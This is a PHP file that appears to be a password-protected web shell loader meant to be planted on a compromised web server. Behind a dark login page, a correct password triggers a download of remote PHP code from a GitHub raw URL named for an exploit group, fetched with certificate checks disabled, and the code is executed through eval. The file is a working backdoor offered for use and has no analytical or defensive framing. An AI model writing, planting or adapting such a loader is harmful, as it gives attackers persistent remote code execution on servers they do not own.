<?php
session_start();
function geturlsinfo($url) {
    if (function_exists('curl_exec')) {
        $conn = curl_init($url);
        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);

        if (isset($_SESSION['coly'])) {
            curl_setopt($conn, CURLOPT_COOKIE, $_SESSION['coly']);
        }

        $url_get_contents_data = curl_exec($conn);
        curl_close($conn);
    } elseif (function_exists('file_get_contents')) {
        $url_get_contents_data = file_get_contents($url);
    } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
        $handle = fopen($url, "r");
        $url_get_contents_data = stream_get_contents($handle);
        fclose($handle);
    } else {
        $url_get_contents_data = false;
    }
    return $url_get_contents_data;
}

function is_logged_in()
{
    return isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true;
}

if (isset($_POST['pass'])) {
    $entered_password = $_POST['pass'];
    $hashed_password = '$2y$10$17I3LbOQNxjVg4QqRFPzsuET05XKrgiGe6CGSJY5BbwBrBexT8.L2'; 
    if (password_verify($entered_password, $hashed_password)) {
        $_SESSION['logged_in'] = true;
        $_SESSION['coly'] = 'asu'; 
    }
}

if (is_logged_in()) {
    $a = geturlsinfo('https://raw.githubusercontent.com/JawaTengahXploit1337/Method/main/loncat.php');
    eval('?>' . $a);
} else {
    ?>
    <html>
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=0.70">
        <title>Login</title>
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
        <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous" />
        <style>
            body {
                height: 100vh;
                display: flex;
                justify-content: center;
                align-items: center;
                background-color: #212529 !important;
                flex-direction: column;
            }
            .login-container {
                width: 300px;
                text-align: center;
            }
            .login-image {
                width: 300px;
                height: auto;
            }
            .login-form {
                width: 100%;
            }
        </style>
    </head>
    <body class="bg-dark">
        <div class="d-flex flex-column align-items-center">
            <img src="https://k.top4top.io/p_3451f6jdd1.png" alt="Login Logo" class="login-image">
            <form method="POST" class="login-form">
                <div class="input-group">
                    <span class="input-group-text"><i class="fas fa-lock"></i></span>
                    <input class="form-control" type="password" placeholder="Enter Passwordnya Dek" name="pass" required>
                    <button class="btn btn-outline-light" type="submit"><i class="fas fa-sign-in-alt"></i></button>
                </div>
            </form>
        </div>
    </body>
    </html>
    <?php
}
?>
